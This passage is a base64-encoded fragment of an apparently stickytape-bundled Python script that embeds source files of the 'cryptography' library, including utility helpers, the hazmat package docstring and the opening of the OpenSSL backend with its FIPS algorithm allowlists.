VjYXRpb25XYXJuaW5nXHJcbkRlcHJlY2F0ZWRJbjM1ID0gQ3J5cHRvZ3JhcGh5RGVwcmVjYXRpb25XYXJuaW5nXHJcbkRlcHJlY2F0ZWRJbjM2ID0gQ3J5cHRvZ3JhcGh5RGVwcmVjYXRpb25XYXJuaW5nXHJcbkRlcHJlY2F0ZWRJbjM3ID0gQ3J5cHRvZ3JhcGh5RGVwcmVjYXRpb25XYXJuaW5nXHJcblxyXG5cclxuZGVmIF9jaGVja19ieXRlcyhuYW1lOiBzdHIsIHZhbHVlOiBieXRlcykgLT4gTm9uZTpcclxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbHVlLCBieXRlcyk6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ7fSBtdXN0IGJlIGJ5dGVzIi5mb3JtYXQobmFtZSkpXHJcblxyXG5cclxuZGVmIF9jaGVja19ieXRlc2xpa2UobmFtZTogc3RyLCB2YWx1ZTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgbWVtb3J5dmlldyh2YWx1ZSlcclxuICAgIGV4Y2VwdCBUeXBlRXJyb3I6XHJcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ7fSBtdXN0IGJlIGJ5dGVzLWxpa2UiLmZvcm1hdChuYW1lKSlcclxuXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gdHlwaW5nX2V4dGVuc2lvbnMgaW1wb3J0IFByb3RvY29sXHJcblxyXG4gICAgX1RfY2xhc3MgPSB0eXBpbmcuVHlwZVZhcigiX1RfY2xhc3MiLCBib3VuZD10eXBlKVxyXG5cclxuICAgIGNsYXNzIF9SZWdpc3RlckRlY29yYXRvclR5cGUoUHJvdG9jb2wpOlxyXG4gICAgICAgIGRlZiBfX2NhbGxfXyhcclxuICAgICAgICAgICAgc2VsZiwga2xhc3M6IF9UX2NsYXNzLCAqLCBjaGVja19hbm5vdGF0aW9uczogYm9vbCA9IEZhbHNlXHJcbiAgICAgICAgKSAtPiBfVF9jbGFzczpcclxuICAgICAgICAgICAgLi4uXHJcblxyXG5cclxuZGVmIHJlZ2lzdGVyX2ludGVyZmFjZShpZmFjZTogYWJjLkFCQ01ldGEpIC0+ICJfUmVnaXN0ZXJEZWNvcmF0b3JUeXBlIjpcclxuICAgIGRlZiByZWdpc3Rlcl9kZWNvcmF0b3IoXHJcbiAgICAgICAga2xhc3M6ICJfVF9jbGFzcyIsICosIGNoZWNrX2Fubm90YXRpb25zOiBib29sID0gRmFsc2VcclxuICAgICkgLT4gIl9UX2NsYXNzIjpcclxuICAgICAgICB2ZXJpZnlfaW50ZXJmYWNlKGlmYWNlLCBrbGFzcywgY2hlY2tfYW5ub3RhdGlvbnM9Y2hlY2tfYW5ub3RhdGlvbnMpXHJcbiAgICAgICAgaWZhY2UucmVnaXN0ZXIoa2xhc3MpXHJcbiAgICAgICAgcmV0dXJuIGtsYXNzXHJcblxyXG4gICAgcmV0dXJuIHJlZ2lzdGVyX2RlY29yYXRvclxyXG5cclxuXHJcbmRlZiBpbnRfdG9fYnl0ZXMoaW50ZWdlcjogaW50LCBsZW5ndGg6IHR5cGluZy5PcHRpb25hbFtpbnRdID0gTm9uZSkgLT4gYnl0ZXM6XHJcbiAgICByZXR1cm4gaW50ZWdlci50b19ieXRlcyhcclxuICAgICAgICBsZW5ndGggb3IgKGludGVnZXIuYml0X2xlbmd0aCgpICsgNykgLy8gOCBvciAxLCAiYmlnIlxyXG4gICAgKVxyXG5cclxuXHJcbmNsYXNzIEludGVyZmFjZU5vdEltcGxlbWVudGVkKEV4Y2VwdGlvbik6XHJcbiAgICBwYXNzXHJcblxyXG5cclxuZGVmIHN0cmlwX2Fubm90YXRpb24oc2lnbmF0dXJlOiBpbnNwZWN0LlNpZ25hdHVyZSkgLT4gaW5zcGVjdC5TaWduYXR1cmU6XHJcbiAgICByZXR1cm4gaW5zcGVjdC5TaWduYXR1cmUoXHJcbiAgICAgICAgW1xyXG4gICAgICAgICAgICBwYXJhbS5yZXBsYWNlKGFubm90YXRpb249aW5zcGVjdC5QYXJhbWV0ZXIuZW1wdHkpXHJcbiAgICAgICAgICAgIGZvciBwYXJhbSBpbiBzaWduYXR1cmUucGFyYW1ldGVycy52YWx1ZXMoKVxyXG4gICAgICAgIF1cclxuICAgIClcclxuXHJcblxyXG5kZWYgdmVyaWZ5X2ludGVyZmFjZShcclxuICAgIGlmYWNlOiBhYmMuQUJDTWV0YSwga2xhc3M6IG9iamVjdCwgKiwgY2hlY2tfYW5ub3RhdGlvbnM6IGJvb2wgPSBGYWxzZVxyXG4pOlxyXG4gICAgZm9yIG1ldGhvZCBpbiBpZmFjZS5fX2Fic3RyYWN0bWV0aG9kc19fOlxyXG4gICAgICAgIGlmIG5vdCBoYXNhdHRyKGtsYXNzLCBtZXRob2QpOlxyXG4gICAgICAgICAgICByYWlzZSBJbnRlcmZhY2VOb3RJbXBsZW1lbnRlZChcclxuICAgICAgICAgICAgICAgICJ7fSBpcyBtaXNzaW5nIGEgeyFyfSBtZXRob2QiLmZvcm1hdChrbGFzcywgbWV0aG9kKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShnZXRhdHRyKGlmYWNlLCBtZXRob2QpLCBhYmMuYWJzdHJhY3Rwcm9wZXJ0eSk6XHJcbiAgICAgICAgICAgICMgQ2FuXCd0IHByb3Blcmx5IHZlcmlmeSB0aGVzZSB5ZXQuXHJcbiAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgc2lnID0gaW5zcGVjdC5zaWduYXR1cmUoZ2V0YXR0cihpZmFjZSwgbWV0aG9kKSlcclxuICAgICAgICBhY3R1YWwgPSBpbnNwZWN0LnNpZ25hdHVyZShnZXRhdHRyKGtsYXNzLCBtZXRob2QpKVxyXG4gICAgICAgIGlmIGNoZWNrX2Fubm90YXRpb25zOlxyXG4gICAgICAgICAgICBvayA9IHNpZyA9PSBhY3R1YWxcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBvayA9IHN0cmlwX2Fubm90YXRpb24oc2lnKSA9PSBzdHJpcF9hbm5vdGF0aW9uKGFjdHVhbClcclxuICAgICAgICBpZiBub3Qgb2s6XHJcbiAgICAgICAgICAgIHJhaXNlIEludGVyZmFjZU5vdEltcGxlbWVudGVkKFxyXG4gICAgICAgICAgICAgICAgInt9Lnt9XCdzIHNpZ25hdHVyZSBkaWZmZXJzIGZyb20gdGhlIGV4cGVjdGVkLiBFeHBlY3RlZDogIlxyXG4gICAgICAgICAgICAgICAgInshcn0uIFJlY2VpdmVkOiB7IXJ9Ii5mb3JtYXQoa2xhc3MsIG1ldGhvZCwgc2lnLCBhY3R1YWwpXHJcbiAgICAgICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBfRGVwcmVjYXRlZFZhbHVlOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBvYmplY3QsIG1lc3NhZ2U6IHN0ciwgd2FybmluZ19jbGFzcyk6XHJcbiAgICAgICAgc2VsZi52YWx1ZSA9IHZhbHVlXHJcbiAgICAgICAgc2VsZi5tZXNzYWdlID0gbWVzc2FnZVxyXG4gICAgICAgIHNlbGYud2FybmluZ19jbGFzcyA9IHdhcm5pbmdfY2xhc3NcclxuXHJcblxyXG5jbGFzcyBfTW9kdWxlV2l0aERlcHJlY2F0aW9ucyh0eXBlcy5Nb2R1bGVUeXBlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBtb2R1bGU6IHR5cGVzLk1vZHVsZVR5cGUpOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18obW9kdWxlLl9fbmFtZV9fKVxyXG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9tb2R1bGUiXSA9IG1vZHVsZVxyXG5cclxuICAgIGRlZiBfX2dldGF0dHJfXyhzZWxmLCBhdHRyOiBzdHIpIC0+IG9iamVjdDpcclxuICAgICAgICBvYmogPSBnZXRhdHRyKHNlbGYuX21vZHVsZSwgYXR0cilcclxuICAgICAgICBpZiBpc2luc3RhbmNlKG9iaiwgX0RlcHJlY2F0ZWRWYWx1ZSk6XHJcbiAgICAgICAgICAgIHdhcm5pbmdzLndhcm4ob2JqLm1lc3NhZ2UsIG9iai53YXJuaW5nX2NsYXNzLCBzdGFja2xldmVsPTIpXHJcbiAgICAgICAgICAgIG9iaiA9IG9iai52YWx1ZVxyXG4gICAgICAgIHJldHVybiBvYmpcclxuXHJcbiAgICBkZWYgX19zZXRhdHRyX18oc2VsZiwgYXR0cjogc3RyLCB2YWx1ZTogb2JqZWN0KSAtPiBOb25lOlxyXG4gICAgICAgIHNldGF0dHIoc2VsZi5fbW9kdWxlLCBhdHRyLCB2YWx1ZSlcclxuXHJcbiAgICBkZWYgX19kZWxhdHRyX18oc2VsZiwgYXR0cjogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIG9iaiA9IGdldGF0dHIoc2VsZi5fbW9kdWxlLCBhdHRyKVxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uob2JqLCBfRGVwcmVjYXRlZFZhbHVlKTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihvYmoubWVzc2FnZSwgb2JqLndhcm5pbmdfY2xhc3MsIHN0YWNrbGV2ZWw9MilcclxuXHJcbiAgICAgICAgZGVsYXR0cihzZWxmLl9tb2R1bGUsIGF0dHIpXHJcblxyXG4gICAgZGVmIF9fZGlyX18oc2VsZikgLT4gdHlwaW5nLlNlcXVlbmNlW3N0cl06XHJcbiAgICAgICAgcmV0dXJuIFsiX21vZHVsZSJdICsgZGlyKHNlbGYuX21vZHVsZSlcclxuXHJcblxyXG5kZWYgZGVwcmVjYXRlZChcclxuICAgIHZhbHVlOiBvYmplY3QsXHJcbiAgICBtb2R1bGVfbmFtZTogc3RyLFxyXG4gICAgbWVzc2FnZTogc3RyLFxyXG4gICAgd2FybmluZ19jbGFzczogdHlwaW5nLlR5cGVbV2FybmluZ10sXHJcbiAgICBuYW1lOiB0eXBpbmcuT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbikgLT4gX0RlcHJlY2F0ZWRWYWx1ZTpcclxuICAgIG1vZHVsZSA9IHN5cy5tb2R1bGVzW21vZHVsZV9uYW1lXVxyXG4gICAgaWYgbm90IGlzaW5zdGFuY2UobW9kdWxlLCBfTW9kdWxlV2l0aERlcHJlY2F0aW9ucyk6XHJcbiAgICAgICAgc3lzLm1vZHVsZXNbbW9kdWxlX25hbWVdID0gbW9kdWxlID0gX01vZHVsZVdpdGhEZXByZWNhdGlvbnMobW9kdWxlKVxyXG4gICAgZHYgPSBfRGVwcmVjYXRlZFZhbHVlKHZhbHVlLCBtZXNzYWdlLCB3YXJuaW5nX2NsYXNzKVxyXG4gICAgIyBNYWludGFpbiBiYWNrd2FyZHMgY29tcGF0aWJpbGl0eSB3aXRoIGBuYW1lIGlzIE5vbmVgIGZvciBweU9wZW5TU0wuXHJcbiAgICBpZiBuYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgIHNldGF0dHIobW9kdWxlLCBuYW1lLCBkdilcclxuICAgIHJldHVybiBkdlxyXG5cclxuXHJcbmRlZiBjYWNoZWRfcHJvcGVydHkoZnVuYzogdHlwaW5nLkNhbGxhYmxlKSAtPiBwcm9wZXJ0eTpcclxuICAgIGNhY2hlZF9uYW1lID0gIl9jYWNoZWRfe30iLmZvcm1hdChmdW5jKVxyXG4gICAgc2VudGluZWwgPSBvYmplY3QoKVxyXG5cclxuICAgIGRlZiBpbm5lcihpbnN0YW5jZTogb2JqZWN0KTpcclxuICAgICAgICBjYWNoZSA9IGdldGF0dHIoaW5zdGFuY2UsIGNhY2hlZF9uYW1lLCBzZW50aW5lbClcclxuICAgICAgICBpZiBjYWNoZSBpcyBub3Qgc2VudGluZWw6XHJcbiAgICAgICAgICAgIHJldHVybiBjYWNoZVxyXG4gICAgICAgIHJlc3VsdCA9IGZ1bmMoaW5zdGFuY2UpXHJcbiAgICAgICAgc2V0YXR0cihpbnN0YW5jZSwgY2FjaGVkX25hbWUsIHJlc3VsdClcclxuICAgICAgICByZXR1cm4gcmVzdWx0XHJcblxyXG4gICAgcmV0dXJuIHByb3BlcnR5KGlubmVyKVxyXG5cclxuXHJcbiMgUHl0aG9uIDMuMTAgY2hhbmdlZCByZXByZXNlbnRhdGlvbiBvZiBlbnVtcy4gV2UgdXNlIHdlbGwtZGVmaW5lZCBvYmplY3RcclxuIyByZXByZXNlbnRhdGlvbiBhbmQgc3RyaW5nIHJlcHJlc2VudGF0aW9uIGZyb20gUHl0aG9uIDMuOS5cclxuY2xhc3MgRW51bShlbnVtLkVudW0pOlxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gZiI8e3NlbGYuX19jbGFzc19fLl9fbmFtZV9ffS57c2VsZi5fbmFtZV99OiB7c2VsZi5fdmFsdWVfIXJ9PiJcclxuXHJcbiAgICBkZWYgX19zdHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIGYie3NlbGYuX19jbGFzc19fLl9fbmFtZV9ffS57c2VsZi5fbmFtZV99IlxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9fX2luaXRfXy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuIiIiXHJcbkhhemFyZG91cyBNYXRlcmlhbHNcclxuXHJcblRoaXMgaXMgYSAiSGF6YXJkb3VzIE1hdGVyaWFscyIgbW9kdWxlLiBZb3Ugc2hvdWxkIE9OTFkgdXNlIGl0IGlmIHlvdVwncmVcclxuMTAwJSBhYnNvbHV0ZWx5IHN1cmUgdGhhdCB5b3Uga25vdyB3aGF0IHlvdVwncmUgZG9pbmcgYmVjYXVzZSB0aGlzIG1vZHVsZVxyXG5pcyBmdWxsIG9mIGxhbmQgbWluZXMsIGRyYWdvbnMsIGFuZCBkaW5vc2F1cnMgd2l0aCBsYXNlciBndW5zLlxyXG4iIiJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmFja2VuZHMvX19pbml0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnlcclxuXHJcblxyXG5kZWYgZGVmYXVsdF9iYWNrZW5kKCkgLT4gQW55OlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuICAgIHJldHVybiBiYWNrZW5kXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L2JhY2tlbmRzL29wZW5zc2wvX19pbml0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgYmFja2VuZFxyXG5cclxuXHJcbl9fYWxsX18gPSBbImJhY2tlbmQiXVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2JhY2tlbmQucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGNvbGxlY3Rpb25zXHJcbmltcG9ydCBjb250ZXh0bGliXHJcbmltcG9ydCBpdGVydG9vbHNcclxuaW1wb3J0IHR5cGluZ1xyXG5pbXBvcnQgd2FybmluZ3NcclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBjb250ZXh0bWFuYWdlclxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzLCB4NTA5XHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IFVuc3VwcG9ydGVkQWxnb3JpdGhtLCBfUmVhc29uc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbCBpbXBvcnQgYWVhZFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5jaXBoZXJzIGltcG9ydCBfQ2lwaGVyQ29udGV4dFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5jbWFjIGltcG9ydCBfQ01BQ0NvbnRleHRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuZGggaW1wb3J0IChcclxuICAgIF9ESFBhcmFtZXRlcnMsXHJcbiAgICBfREhQcml2YXRlS2V5LFxyXG4gICAgX0RIUHVibGljS2V5LFxyXG4gICAgX2RoX3BhcmFtc19kdXAsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuZHNhIGltcG9ydCAoXHJcbiAgICBfRFNBUGFyYW1ldGVycyxcclxuICAgIF9EU0FQcml2YXRlS2V5LFxyXG4gICAgX0RTQVB1YmxpY0tleSxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5lYyBpbXBvcnQgKFxyXG4gICAgX0VsbGlwdGljQ3VydmVQcml2YXRlS2V5LFxyXG4gICAgX0VsbGlwdGljQ3VydmVQdWJsaWNLZXksXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuZWQyNTUxOSBpbXBvcnQgKFxyXG4gICAgX0VkMjU1MTlQcml2YXRlS2V5LFxyXG4gICAgX0VkMjU1MTlQdWJsaWNLZXksXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuZWQ0NDggaW1wb3J0IChcclxuICAgIF9FRDQ0OF9LRVlfU0laRSxcclxuICAgIF9FZDQ0OFByaXZhdGVLZXksXHJcbiAgICBfRWQ0NDhQdWJsaWNLZXksXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuaGFzaGVzIGltcG9ydCBfSGFzaENvbnRleHRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuaG1hYyBpbXBvcnQgX0hNQUNDb250ZXh0XHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLnBvbHkxMzA1IGltcG9ydCAoXHJcbiAgICBfUE9MWTEzMDVfS0VZX1NJWkUsXHJcbiAgICBfUG9seTEzMDVDb250ZXh0LFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLnJzYSBpbXBvcnQgKFxyXG4gICAgX1JTQVByaXZhdGVLZXksXHJcbiAgICBfUlNBUHVibGljS2V5LFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLngyNTUxOSBpbXBvcnQgKFxyXG4gICAgX1gyNTUxOVByaXZhdGVLZXksXHJcbiAgICBfWDI1NTE5UHVibGljS2V5LFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLng0NDggaW1wb3J0IChcclxuICAgIF9YNDQ4UHJpdmF0ZUtleSxcclxuICAgIF9YNDQ4UHVibGljS2V5LFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5fcnVzdCBpbXBvcnQgKFxyXG4gICAgeDUwOSBhcyBydXN0X3g1MDksXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJpbmRpbmdzLm9wZW5zc2wgaW1wb3J0IGJpbmRpbmdcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcywgc2VyaWFsaXphdGlvblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5fYXN5bW1ldHJpYyBpbXBvcnQgQXN5bW1ldHJpY1BhZGRpbmdcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYyBpbXBvcnQgKFxyXG4gICAgZGgsXHJcbiAgICBkc2EsXHJcbiAgICBlYyxcclxuICAgIGVkMjU1MTksXHJcbiAgICBlZDQ0OCxcclxuICAgIHJzYSxcclxuICAgIHgyNTUxOSxcclxuICAgIHg0NDgsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5wYWRkaW5nIGltcG9ydCAoXHJcbiAgICBNR0YxLFxyXG4gICAgT0FFUCxcclxuICAgIFBLQ1MxdjE1LFxyXG4gICAgUFNTLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMudHlwZXMgaW1wb3J0IChcclxuICAgIENFUlRJRklDQVRFX0lTU1VFUl9QVUJMSUNfS0VZX1RZUEVTLFxyXG4gICAgUFJJVkFURV9LRVlfVFlQRVMsXHJcbiAgICBQVUJMSUNfS0VZX1RZUEVTLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMgaW1wb3J0IChcclxuICAgIEJsb2NrQ2lwaGVyQWxnb3JpdGhtLFxyXG4gICAgQ2lwaGVyQWxnb3JpdGhtLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMuYWxnb3JpdGhtcyBpbXBvcnQgKFxyXG4gICAgQUVTLFxyXG4gICAgQVJDNCxcclxuICAgIENhbWVsbGlhLFxyXG4gICAgQ2hhQ2hhMjAsXHJcbiAgICBTTTQsXHJcbiAgICBUcmlwbGVERVMsXHJcbiAgICBfQmxvd2Zpc2hJbnRlcm5hbCxcclxuICAgIF9DQVNUNUludGVybmFsLFxyXG4gICAgX0lERUFJbnRlcm5hbCxcclxuICAgIF9TRUVESW50ZXJuYWwsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5tb2RlcyBpbXBvcnQgKFxyXG4gICAgQ0JDLFxyXG4gICAgQ0ZCLFxyXG4gICAgQ0ZCOCxcclxuICAgIENUUixcclxuICAgIEVDQixcclxuICAgIEdDTSxcclxuICAgIE1vZGUsXHJcbiAgICBPRkIsXHJcbiAgICBYVFMsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmIGltcG9ydCBzY3J5cHRcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuc2VyaWFsaXphdGlvbiBpbXBvcnQgcGtjczcsIHNzaFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5zZXJpYWxpemF0aW9uLnBrY3MxMiBpbXBvcnQgKFxyXG4gICAgUEtDUzEyQ2VydGlmaWNhdGUsXHJcbiAgICBQS0NTMTJLZXlBbmRDZXJ0aWZpY2F0ZXMsXHJcbiAgICBfQUxMT1dFRF9QS0NTMTJfVFlQRVMsXHJcbiAgICBfUEtDUzEyX0NBU19UWVBFUyxcclxuKVxyXG5cclxuXHJcbl9NZW1vcnlCSU8gPSBjb2xsZWN0aW9ucy5uYW1lZHR1cGxlKCJfTWVtb3J5QklPIiwgWyJiaW8iLCAiY2hhcl9wdHIiXSlcclxuXHJcblxyXG4jIE5vdCBhY3R1YWxseSBzdXBwb3J0ZWQsIGp1c3QgdXNlZCBhcyBhIG1hcmtlciBmb3Igc29tZSBzZXJpYWxpemF0aW9uIHRlc3RzLlxyXG5jbGFzcyBfUkMyOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEJhY2tlbmQ6XHJcbiAgICAiIiJcclxuICAgIE9wZW5TU0wgQVBJIGJpbmRpbmcgaW50ZXJmYWNlcy5cclxuICAgICIiIlxyXG5cclxuICAgIG5hbWUgPSAib3BlbnNzbCJcclxuXHJcbiAgICAjIEZJUFMgaGFzIG9waW5pb25zIGFib3V0IGFjY2VwdGFibGUgYWxnb3JpdGhtcyBhbmQga2V5IHNpemVzLCBidXQgdGhlXHJcbiAgICAjIGRpc2FsbG93ZWQgYWxnb3JpdGhtcyBhcmUgc3RpbGwgcHJlc2VudCBpbiBPcGVuU1NMLiBUaGV5IGp1c3QgZXJyb3IgaWZcclxuICAgICMgeW91IHRyeSB0byB1c2UgdGhlbS4gVG8gYXZvaWQgdGhhdCB3ZSBhbGxvd2xpc3QgdGhlIGFsZ29yaXRobXMgaW5cclxuICAgICMgRklQUyAxNDAtMy4gVGhpcyBpc25cJ3QgaWRlYWwsIGJ1dCBGSVBTIDE0MC0zIGlzIHRyYXNoIHNvIGhlcmUgd2UgYXJlLlxyXG4gICAgX2ZpcHNfYWVhZCA9IHtcclxuICAgICAgICBiImFlcy0xMjgtY2NtIixcclxuICAgICAgICBiImFlcy0xOTItY2NtIixcclxuICAgICAgICBiImFlcy0yNTYtY2NtIixcclxuICAgICAgICBiImFlcy0xMjgtZ2NtIixcclxuICAgICAgICBiImFlcy0xOTItZ2NtIixcclxuICAgICAgICBiImFlcy0yNTYtZ2NtIixcclxuICAgIH1cclxuICAgICMgVHJpcGxlREVTIGVuY3J5cHRpb24gaXMgZGlzYWxsb3dlZC9kZXByZWNhdGVkIHRocm91Z2hvdXQgMjAyMyBpblxyXG4gICAgIyBGSVBTIDE0MC0zLiBUbyBrZWVwIGl0IHNpbXBsZSB3ZSBkZW55bGlzdCBhbnkgdXNlIG9mIFRyaXBsZURFUyAoVERFQSkuXHJcbiAgICBfZmlwc19jaXBoZXJzID0gKEFFUywpXHJcbiAgICAjIFNvbWV0aW1lcyBTSEExIGlzIHN0aWxsIHBlcm1pc3NpYmxlLiBUaGF0IGxvZ2ljIGlzIGNvbnRhaW5lZFxyXG4gICAgIyB3aXRoaW4gdGhlIHZhcmlvdXMgKl9zdXBwb3J0ZWQgbWV0aG9kcy5cclxuICAgIF9maXBzX2hhc2hlcyA9IChcclxuICAgICAgICBoYXNoZXMuU0hBMjI0LFxyXG4gICAgICAgIGhhc2hlcy5TSEEyNTYsXHJcbiAgICAgICAgaGFzaGVzLlNIQTM4NCxcclxuICAgICAgICBoYXNoZXMuU0hBNTEyLFxyXG4gICAgICAgIGhhc2hlcy5TSEE1MTJfMjI0LFxyXG4gICAgICAgIGhhc2hlcy5TSEE1MTJfMjU2LFxyXG4gICAgICAgIGhhc2hlcy5TSEEzXzIyNCxcclxuICAgICAgICBoYXNoZXMuU0hBM18yNTYsXHJcbiAgICAgICAgaGFzaGVzLlNIQTNfMzg0LFxyXG4gICAgICAgIGhhc2hlcy5TSEEzXzUxMixcclxuICAgICAgICBoYXNoZXMuU0hBS0UxMjgsXHJcbiAgICAgICAgaGFzaGVzLlNIQUtFMjU2LFxyXG4gICAgKVxyXG4gICAgX2ZpcHNfZWNkaF9jdXJ2ZXMgPSAoXHJcbiAgICAgICAgZWMuU0VDUDIyNFIxLFxyXG4gICAgICAgIGVjLlNFQ1A